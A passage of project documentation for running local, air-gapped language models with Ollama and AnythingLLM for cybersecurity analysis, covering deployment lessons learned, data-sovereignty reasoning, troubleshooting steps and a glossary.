Authentication: Domain-joined, password policy minimum 8 chars
Patch status: 30 days behind current
```

**Step 3:** The model responds from an attacker's perspective — enumerating the most likely exploitation paths, prioritizing by ease of exploitation and potential impact, and identifying the configuration details that represent the greatest risk.

> 📸 **Screenshot needed:** AnythingLLM Red Team workspace showing a network configuration submitted and the model's adversarial assessment response

---

## Lessons Learned

This section documents what went wrong during the development process — the dead ends, the failed configurations, and the decisions that had to be reversed. These are as important as the successes for anyone attempting to replicate this setup.

---

### Docker Desktop: The Overhead Problem

The Docker approach seemed reasonable on paper — containerization provides isolation, portability, and a clean deployment environment. In practice, it introduced two problems that made it unsuitable for this use case.

**Problem 1: GPU passthrough friction.** Getting Docker Desktop on Windows to correctly pass GPU resources to the container required configuring the NVIDIA Container Toolkit, which is primarily designed for Linux. The Windows implementation added configuration complexity and did not reliably expose the full 16GB of VRAM to the container. In testing, the containerized Ollama instance showed lower effective VRAM utilization than the native installation on the same hardware.

**Problem 2: Performance overhead was measurable.** Every inference request passing through the container abstraction layer added latency. On a task that produced a response in 45 seconds natively, the containerized version took 60–75 seconds. For occasional use that difference is tolerable. For sustained analytical work it compounds into a significant productivity loss.

**What would make Docker viable:** A Linux host OS eliminates most of the GPU passthrough friction. If this infrastructure were deployed on a Linux server rather than a Windows workstation, Docker would be a reasonable approach. On Windows with a gaming-class GPU, it is not the right tool.

**The ngrok dependency:** The intent was to expose the local Ollama API through ngrok for remote access. This was abandoned not just because of performance issues, but because it fundamentally contradicts the data sovereignty goal. Any request routed through ngrok passes through ngrok's servers. That is not air-gapped. The approach was architecturally incompatible with the use case regardless of performance.

---

### WSL: The Abstraction Layer Problem

WSL2 runs a full Linux kernel in a lightweight virtual machine. The theory was that running Ollama in a native Linux environment would produce better performance than the Windows native installation. The theory was wrong in practice.

**Problem 1: GPU driver integration instability.** WSL2 uses a translation layer to expose the Windows NVIDIA driver to the Linux environment. This works adequately for many workloads but showed instability during sustained inference runs — specifically, the GPU would occasionally drop its context, causing inference to stall and requiring a restart of the Ollama service. This happened rarely but unpredictably, which is worse than consistent degraded performance for analytical work.

**Problem 2: The abstraction layer added latency.** The GPU access path in WSL2 is: Linux application → WSL2 kernel → Windows hypervisor → Windows NVIDIA driver → GPU. The native path is: Windows application → Windows NVIDIA driver → GPU. Every extra hop in that chain costs time. In practice, inference speeds were 10–15% lower than native on the same model.

**Problem 3: Resource allocation complexity.** WSL2 requires configuring how much system RAM is allocated to the Linux VM via `.wslconfig`. Getting this right for large model inference — where RAM requirements vary significantly between models — required constant adjustment. The native installation handles this dynamically without configuration.

**What was learned:** The assumption that "Linux is better for AI workloads" is true in server contexts where the entire OS is Linux. In a WSL environment on Windows, you get Linux's complexity without Linux's performance advantages. For a single-user Windows workstation, native installation is the correct choice.

---

### Model Library: What Got Removed and Why

The library started with 18+ models in late May 2025. The pruning process removed models for several reasons:

**Redundancy:** Multiple models covering the same capability at similar quality. When testing showed two models producing near-identical output on the same tasks, the smaller or less-capable one was removed. Disk space is finite and model switching time has a cost.

**Size/performance mismatch:** Some models were large without being proportionally better. A 20GB model that produced output equivalent to a 9GB model on relevant tasks was removed in favor of the smaller option.

**Domain mismatch:** Several general-purpose models were retained early in the process on the assumption they would cover gaps. Testing showed the domain-specific models handled security work better than the general models in almost every case. The general models that survived (Qwen3:32b) did so because they genuinely outperformed alternatives on non-specialized tasks, not because they were good enough at specialized tasks.

**Key lesson:** Start with a broader library than you need, test systematically on representative tasks, and remove anything that is not clearly the best option for at least one distinct role. A smaller, well-curated library outperforms a larger undifferentiated one.

---

### What Would Be Done Differently

**Start with native installation.** Three weeks were spent testing Docker and WSL before arriving at the conclusion that native Windows was the correct deployment. That time could have been spent on model evaluation and workflow development. The lesson is to start with the simplest approach and only add complexity when the simple approach demonstrably fails.

**Define use cases before pulling models.** The early library of 18+ models was assembled by pulling anything that seemed interesting or potentially relevant. A more disciplined approach — define the specific analytical tasks first, then identify the best model for each task — would have produced the current library faster and with less wasted storage.

**Test on real workloads immediately.** Early model testing used simple prompts to evaluate output quality. Moving to representative real-world tasks (actual CISA alerts, actual code samples, actual threat scenarios) earlier in the process would have accelerated the selection process significantly.

---

## Security and Privacy Considerations

Local AI deployment is often framed as a performance or cost decision. For federal cybersecurity work it is primarily a security and privacy decision. This section explains why that distinction matters.

---

### The Data Sovereignty Problem with Cloud AI

Every query sent to a cloud AI service — ChatGPT, Gemini, Claude, Copilot — travels across the internet to a third-party server, is processed by that company's infrastructure, and may be retained, logged, or used for model training depending on the service's terms of service and privacy policy.

For most use cases this is an acceptable tradeoff. For cybersecurity work involving sensitive data it is not, for several reasons:

**Classification and sensitivity.** Threat intelligence data, network configurations, malware samples, and incident details often carry sensitivity designations that prohibit transmission to external systems. A cloud AI query is an external transmission. There is no way to use cloud AI for this data without violating handling requirements.

**Chain of custody.** In incident response, the handling of evidence matters. Transmitting forensic artifacts to a commercial AI service creates chain-of-custody complications that can affect legal and regulatory proceedings.

**Operational security.** An adversary who has compromised a cloud AI provider — or who can compel access through legal means — potentially gains visibility into the queries being run. Asking a cloud AI "what does this malware do?" reveals that you have the malware, what you are investigating, and how you are approaching the analysis.

**Corporate data retention.** Commercial AI providers retain query data for periods ranging from days to indefinitely depending on account type and policy. Queries submitted for security analysis may be reviewed by provider staff, used to improve models, or disclosed in response to legal requests.

---

### How Local Deployment Eliminates These Risks

When inference runs entirely on local hardware:

- **No transmission occurs.** The query never leaves the machine. There is nothing to intercept, retain, or compel disclosure of.
- **No third-party access.** The model provider (Meta, Alibaba, DeepSeek, Microsoft) has no visibility into queries run against their models once the model weights are downloaded. Inference is computation, not a service.
- **No terms of service constraint.** There are no usage restrictions on what data can be analyzed locally. Classification handling requirements are met by keeping data local.
- **Complete audit trail control.** The organization controls what is logged, what is retained, and what is accessible. There is no external log to subpoena.

---

### Air-Gap Capability

The production deployment in this project has zero external network dependencies during operation. Once models are downloaded, the system can operate with the network connection physically disconnected and all functionality is preserved.

This is significant for federal environments where systems handling sensitive data may be physically air-gapped — isolated from all external networks. Cloud AI tools are categorically unusable in these environments. Local AI infrastructure like this deployment is not only usable but represents the only viable path to AI-assisted analysis in those environments.

---

### A Note on Model Weights and Trust

Downloading and running a model locally does not make it automatically trustworthy. Model weights are large binary files from third-party sources. Best practices for this deployment:

- Download models only from the official Ollama registry or trusted publishers
- Verify model checksums where available
- Treat community-uploaded models (as opposed to official publisher releases) with appropriate skepticism
- Do not run models from unknown sources on systems handling sensitive data

The models in this library are sourced from established publishers (Meta, Alibaba, DeepSeek, Microsoft) or well-documented community security projects. All were pulled through the official Ollama registry.

---

## Troubleshooting

Common errors encountered during deployment and their solutions, documented from actual experience building this infrastructure.

---

### Ollama

**`ollama: command not found` after installation**

The Ollama installer adds itself to PATH, but the change may not be reflected in an already-open terminal.

*Fix:* Close and reopen Command Prompt or PowerShell. If the problem persists, verify the installation by checking `C:\Users\[username]\AppData\Local\Programs\Ollama\` — the executable should be present. Add the directory to PATH manually if needed.

---

**Model pulls fail partway through or show connection errors**

Large model downloads (18–42GB) are vulnerable to network interruptions.

*Fix:* Re-run `ollama pull modelname:tag`. Ollama resumes incomplete downloads automatically — it does not restart from zero. Run the pull command again and it will continue from where it stopped.

---

**`ollama run` produces output but GPU utilization stays at 0%**

The model is running on CPU only. This produces significantly slower inference and means VRAM is not being used.

*Fix:* Verify NVIDIA drivers are current. Open Device Manager → Display Adapters → confirm the RTX 4080 is listed without warnings. Run `nvidia-smi` in Command Prompt — if this command fails, the driver is not installed correctly. Reinstall NVIDIA drivers from [nvidia.com](https://www.nvidia.com/drivers) and restart the system before retrying.

---

**Ollama crashes or stops responding during long inference runs**

Usually a thermal or power issue, not a software bug.

*Fix:* Check GPU temperature in Task Manager → Performance → GPU → Temperature. If temperature exceeds 85°C during inference, the GPU is thermal throttling. Improve case airflow or verify cooling is functioning. Also check Event Viewer → Windows Logs → System for GPU-related errors that may indicate a driver or hardware issue.

---

**`error: model requires more system memory than available`**

The model is too large for available RAM + VRAM combined.

*Fix:* Close other applications to free system RAM before running the model. For the 70B model specifically, ensure at least 48GB of system RAM is free before loading. If RAM is consistently insufficient, consider switching to a smaller quantized version of the model.

---

**Models listed in `ollama list` don't appear in AnythingLLM**

AnythingLLM caches the model list at startup and doesn't always refresh automatically.

*Fix:* In AnythingLLM Settings → AI Providers → LLM Provider, click the refresh icon next to the model dropdown. If models still don't appear, verify Ollama is running (`ollama serve` in terminal), then restart AnythingLLM completely.

---

### AnythingLLM

**AnythingLLM shows "Could not connect to Ollama" in settings**

The Ollama service is not running or the URL is incorrect.

*Fix:* Open Command Prompt and run `ollama serve`. If it returns "address already in use," Ollama is running and the issue is the URL. Confirm the Base URL in AnythingLLM settings is exactly `http://localhost:11434` — no trailing slash, no https. If Ollama is not running, it may need to be started manually: search for Ollama in the Start Menu and launch it.

---

**Workspace responses are slow even for small prompts**

The workspace is assigned a large model that requires VRAM offload.

*Fix:* Check which model is assigned to the workspace in workspace settings. If the workspace is set to `llama3.1:70b` for routine queries, switch it to `qwen3:32b` or `phi4-reasoning:14b` for faster responses. Reserve the 70B model for workspaces where its reasoning depth is genuinely needed.

---

**System prompt doesn't seem to be affecting model behavior**

The system prompt was saved but the model is not following it.

*Fix:* Verify the prompt was actually saved — open workspace settings → Prompt tab and confirm the text is present. Start a new chat rather than continuing an existing one (the system prompt applies to new chats; existing chats retain the prompt that was active when they started). If the model still ignores the prompt, check that the prompt is not excessively long — some models handle very long system prompts poorly. Trim to the essential instructions.

---

**AnythingLLM crashes when loading a large document**

Document ingestion for RAG purposes can consume significant RAM.

*Fix:* Reduce the document size before ingestion — split large PDFs into sections. Ensure at least 8GB of free system RAM before uploading documents. Close unnecessary background applications. If the crash is consistent, check the AnythingLLM logs in `%AppData%\AnythingLLM\logs\` for specific error messages.

---

## Glossary

Key terms used throughout this documentation, defined for readers without a deep technical background in AI infrastructure.

---

**Air-gap**
A security configuration where a computer or network is physically isolated from external networks — no internet connection, no wireless, no external data path of any kind. An air-gapped AI deployment runs entirely without internet access. Once models are downloaded, this system can operate fully air-gapped.

---

**AnythingLLM**
The interface layer used in this project. AnythingLLM is a desktop application that provides workspaces, document ingestion, conversation history, and system prompt management on top of a model runtime like Ollama. It is what the user interacts with; Ollama handles the actual model execution underneath.

---

**Chain-of-thought reasoning**
A model behavior where the AI works through a problem step by step before arriving at a conclusion, making its reasoning process visible. The DeepSeek R1 model in this library is specifically trained to produce chain-of-thought output. This matters in cybersecurity analysis because the reasoning path can be audited and challenged, not just the final answer.

---

**Data sovereignty**
Control over where data goes and who can access it. In federal cybersecurity, data sovereignty means sensitive information stays within controlled systems and is never transmitted to external services. Local AI deployment maintains complete data sovereignty — no data leaves the machine.

---

**Fine-tuning**
The process of taking a pre-trained model and continuing to train it on a specific dataset to improve its performance on a particular domain. The cybersecurity models in this library (ALIENTELLIGENCE, BlackHat Hacker) are fine-tuned versions of base models — they started as general models and were further trained on security-specific data.

---

**Inference**
The process of running a model to generate output. When you submit a prompt and the model produces a response, that is inference. Inference is computationally intensive and is the primary workload that drives VRAM and RAM requirements.

---

**Ollama**
The model runtime used in this project. Ollama is an open-source tool that downloads, manages, and runs large language models locally. It handles the technical complexity of loading model weights onto the GPU and exposes a simple API that other applications use to query models.

---

**Quantization**
A technique for reducing a model's size by representing its internal numbers (weights) with less precision. A full-precision model stores each weight as a 16-bit or 32-bit number. A Q4 quantized model stores each weight as a 4-bit number — roughly 4x smaller. Quantization makes large models fit on consumer hardware at the cost of some output quality. The 70B Llama model in this library uses Q4_K_M quantization to fit within available RAM.

---

**RAG (Retrieval-Augmented Generation)**
A technique where a model is given access to a document library and can retrieve relevant passages before generating a response. In AnythingLLM, RAG allows you to upload documents (threat reports, policy documents, CVE databases) and ask the model questions that draw on those specific documents rather than just its training data.

---

**System prompt**
A persistent instruction set given to a model before any user interaction begins. In AnythingLLM, each workspace has a system prompt that is automatically sent at the start of every conversation — defining the model's role, behavior, and analytical framework. The user never sees or has to re-enter the system prompt; it is built into the workspace.

---

**Tokens / tokens per second**
AI models process text as tokens — chunks of text roughly corresponding to words or word fragments. A model generating at 3–5 tokens per second produces approximately 3–5 words per second of output. Response time for a 500-word analysis at 4 tokens/second is approximately 2 minutes.

---

**VRAM (Video RAM)**
Memory on the GPU used to store model weights during inference. VRAM is faster than system RAM for GPU computations but limited in quantity — the RTX 4080 has 16GB. Models that fit entirely in VRAM run at full speed. Models that exceed VRAM capacity offload layers to system RAM, which reduces inference speed due to the data transfer required between the two memory types.

---

## References

- [Ollama Documentation](https://docs.ollama.com)
- [Ollama Windows Download](https://ollama.com/download/windows)
- [AnythingLLM Desktop Download](https://anythingllm.com/desktop)
- [AnythingLLM Documentation](https://docs.anythingllm.com)
- [MITRE ATT&CK Framework](https://attack.mitre.org)
- [CISA Alerts and Advisories](https://www.cisa.gov/news-events/cybersecurity-advisories)
- [NVD CVE Database](https://nvd.nist.gov)
- [NVIDIA Driver Downloads](https://www.nvidia.com/drivers)
- [CompTIA Security+ Certification](https://www.comptia.org/certifications/security)
- [CompTIA CySA+ Certification](https://www.comptia.org/certifications/cybersecurity-analyst)
- [NIST National Vulnerability Database](https://nvd.nist.gov)
- [CompTIA Security+ Certification](https://www.comptia.org/certifications/security)
- [CompTIA CySA+ Certification](https://www.comptia.org/certifications/cybersecurity-analyst)
